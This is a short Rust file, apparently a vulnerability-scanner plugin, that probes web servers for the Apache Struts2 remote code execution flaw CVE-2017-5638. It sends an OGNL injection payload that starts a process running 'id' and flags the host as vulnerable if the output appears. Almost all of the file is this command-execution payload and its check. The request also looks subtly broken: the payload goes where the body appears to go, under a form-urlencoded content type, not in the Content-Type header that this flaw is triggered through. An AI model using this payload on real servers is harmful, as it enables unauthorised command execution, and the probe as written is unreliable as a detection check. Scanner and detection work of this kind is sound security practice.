/* http-vuln-cve2017-5638-3 - CVE-2017-5638 Struts2 RCE probe */
#![allow(dead_code)]
mod arsenal;
use arsenal::*;

#[no_mangle]
pub extern "C" fn almap_script_run(ctx: *mut AlScriptContext) -> i32 {
    let resp = match http_request(ctx, "POST", "/", None, "\r\n",
        "%{(#_='multipart/form-data').(#cmd='id').(#p=new java.lang.ProcessBuilder(#cmd)).(#p.start())}",
        Some("application/x-www-form-urlencoded"), 8192) {
        Some(r) if !r.is_empty() => r,
        _ => { set_out(ctx, "CVE-2017-5638: no response"); return 0; }
    };
    let body = http_body(&resp);
    if contains_ci(body, "uid=") || contains_ci(body, "gid=") {
        set_out(ctx, "VULNERABLE: CVE-2017-5638 Struts2 RCE");
    } else {
        set_out(ctx, &format!("not vulnerable: CVE-2017-5638 (HTTP {})",
                              http_status(&resp)));
    }
    0
}
